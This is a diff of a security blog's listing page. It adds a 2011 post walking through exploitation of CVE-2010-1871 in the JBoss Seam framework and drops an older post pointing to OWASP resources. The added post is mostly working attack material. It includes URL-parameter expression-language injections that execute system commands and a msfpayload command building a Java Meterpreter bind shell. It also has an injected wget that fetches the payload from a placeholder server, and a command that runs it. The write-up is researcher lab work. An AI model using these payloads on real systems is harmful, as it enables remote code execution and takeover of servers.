@@ -165,6 +165,47 @@
   </span>
 
   <h2>
+    <a href="https://raesene.github.io/blog/2011/07/30/from-poc-to-shell-cve-2010-1871/">From PoC to Shell - CVE-2010-1871</a>
+  </h2>
+
+  <div>
+    
+    
+    <p>I had a chance to look at CVE-2010-1871 recently which is a vulnerability in JBoss expression language.  As it was an interesting looking vulnerability, I thought it'd be worth walking it through to the point of getting a shell on a vulnerable box, and as it took a bit of fiddling and googling on my part to get there, I figured it could be worth writing up.</p>
+<p>There's a good write-up from the guy who discovered the vulnerability <a title="o0o security research" href="http://blog.o0o.nu/2010/07/cve-2010-1871-jboss-seam-framework.html" target="_blank">here</a> but the basics of the vulnerability is that version of the JBoss SEAM framework have an expression language which can be used to directly execute java code.  (Un)fortuntely it was possible for certain URL parameters passed by users of the application to be executed, which introduces a vulnerability.</p>
+<p>In the blog post Meder goes through the process of finding the appropriate java classess and executing code using reflection, so far so good.  When I came to walk through the PoC exploit (creating a directory on the vulnerable server) the last command<br />
+<code>/seam-booking/home.seam?actionOutcome=/pwn.xhtml?pwned%3d%23{expressions.getClass().forName('java.lang.Runtime').getDeclaredMethods()[19].invoke(expressions.getClass().forName('java.lang.Runtime').getDeclaredMethods()[7].invoke(null), 'mkdir /tmp/PWNED')}</code></p>
+<p>wasn't working for me... so Google time :) (NB, the reference to seam-booking/home.seam is for the sample app used for the PoC, but this should work on any SEAM framework app)</p>
+<p>Looking round to see if anyone else had any joy with this vuln. I came across a post on <a title="Stack Overflow Post" href="http://stackoverflow.com/questions/6635974/jboss-seam-interpolator-could-it-be-use-for-execute-command-java-lang-runtime-e" target="_blank">Stackoverflow</a> , where it looked like someone was getting targeted with this issue in the wild (one to take note of if you run  JBoss!).  From that it looks like the attackers had come to a slightly different means of exploiting the issue, and testing it seemed to work well.  So the basic PoC is setting the actionOutcome parameter to</p>
+<p><code>actionOutcome=/pwn.xhtml?pwned%3d%23{expressions.getClass().forName('java.lang.Runtime').getDeclaredMethods()[6].invoke(expressions.getClass().forName('java.lang.Runtime')).exec('mkdir%20/tmp/pwned')}</code></p>
+<p>This has worked ok for me on Linux and windows (as target platforms).</p>
+<p>Great, so now we have a basic PoC how do we move onto getting a full shell on our vulnerable system?  There's doubtless a number of ways of doing this, but here's one I hit on which seems to work pretty reliably.</p>
+<p>Given that the target server is running a JBoss service, it's a reasonable assumption that it will have java installed, so we can breakout the Java Meterpreter.  First up create the payload using msfpayload.  I used bind_tcp in the lab and it's worth noting that the default metasploit port (4444) is in use, so using a different on (eg, 5556) was a good plan.</p>
+<p><code>./msfpayload java/meterpreter/bind_tcp LPORT=5556 X &gt; lin.jar</code></p>
+<p>Gives us our file payload, now we just need to get it deployed to the target system.  On linux, it's a fair bet that wget will be installed, so I used that to download the file from a webserver</p>
+<p><code>/seam-booking/home.seam?actionOutcome=/pwn.xhtml?pwned%3d%23{expressions.getClass().forName('java.lang.Runtime').getDeclaredMethods()[6].invoke(expressions.getClass().forName('java.lang.Runtime')).exec('wget%20-O%20/tmp/lin.jar%20http://&lt;server&gt;/lin.jar')}</code></p>
+<p>This places the file into /tmp, so now we just need to run it, which is pretty straightforward</p>
+<p><code>/seam-booking/home.seam?actionOutcome=/pwn.xhtml?pwned%3d%23{expressions.getClass().forName('java.lang.Runtime').getDeclaredMethods()[6].invoke(expressions.getClass().forName('java.lang.Runtime')).exec('java%20-jar%20/tmp/lin.jar')}</code></p>
+<p>Having done that, it's just a question of spinning up the metasploit exploit handler and connecting to your waiting meterpreter shell.</p>
+
+    
+    
+  </div>
+
+</article>
+
+
+<article class="home">
+
+  <span class="post-date">
+    
+    July
+    30th,
+    
+    2011
+  </span>
+
+  <h2>
     <a href="https://raesene.github.io/blog/2011/07/30/b-sides-london-videos-presentations-up/">B-Sides London Videos & Presentations Up</a>
   </h2>
 
@@ -532,37 +573,6 @@ So what would have likely been a relatively minor access control issue in an Int
 
 </article>
 
-
-<article class="home">
-
-  <span class="post-date">
-    
-    April
-    1st,
-    
-    2010
-  </span>
-
-  <h2>
-    <a href="https://raesene.github.io/blog/2010/04/01/scottish_ruby_c_2/">Scottish Ruby Conference follow-up - 2 - Securing your app.</a>
-  </h2>
-
-  <div>
-    
-    
-    <p>Most of the questions I got after my talk were around how people can look to secure their application.  I mentioned a couple of sites and it's probably worth expanding on the points made.<br />
-<b> Web Application Security</b><br />
-For people looking to understand how to secure their web applications, in my opinion the best source of free information is the <a href="http://www.owasp.org">OWASP project</a> .  It's an umbrella for a number of web application security efforts.<br />
-They've got a wide variety of projects which target management, security testers and developers, but some of the best places to start for developers are the <a href="http://www.owasp.org/index.php/Guide_Table_of_Contents">Owasp developers Guide</a> which covers a wide range of topics about secure development in a fairly generic way, and there's also the Ruby on Rails Security Guide <a href="http://www.owasp.org/index.php/Category:OWASP_Ruby_on_Rails_Security_Guide_V2"> here </a> or <a href="http://guides.rubyonrails.org/security.html">here</a> which covers rails specific topics.<br />
-Both of those documents are relatively large but well worth delving into.  For a quick few of the "most serious" web application security issues, OWASP also has the <a href="http://www.owasp.org/index.php/Category:OWASP_Top_Ten_Project">Top Ten project</a>.  The latest version, current in <a href="http://www.owasp.org/index.php/File:OWASP_T10_-_2010_rc1.pdf">RC1</a> has some good summaries of the top risks, and is a good place to start getting an idea of the areas to be addressed...<br />
-There's also a newish book dedicated to the topic of <a href="http://www.pragprog.com/titles/fr_secure/security-on-rails">security on rails</a>.  I picked up a copy at the conference (I'm a sucker for the O'Reilly stand!), so I've not had time to get all the way through it, but first impressions are that it'll be very good, with concrete examples of broken rails applications and how to fix them.</p>
-
-    
-    
-  </div>
-
-</article>
-
 <hr/>
 
 <ul class="pager"> 
@@ -576,7 +586,7 @@ There's also a newish book dedicated to the topic of <a href="http://www.pragpro
   
   
   <li>
-    <span class="page_number">Page: 13 of 55</span>
+    <span class="page_number">Page: 13 of 56</span>
   </li>
 
   
@@ -593,7 +603,7 @@ There's also a newish book dedicated to the topic of <a href="http://www.pragpro
 		<footer>
 			<hr/>
 			<p>
-				&copy; 2022 raesene with Jekyll. Theme: <a href="https://github.com/dbtek/dbyll">dbyll</a> by dbtek.
+				&copy; 2023 raesene with Jekyll. Theme: <a href="https://github.com/dbtek/dbyll">dbyll</a> by dbtek.
 			</p>
 		</footer>
 	</div>
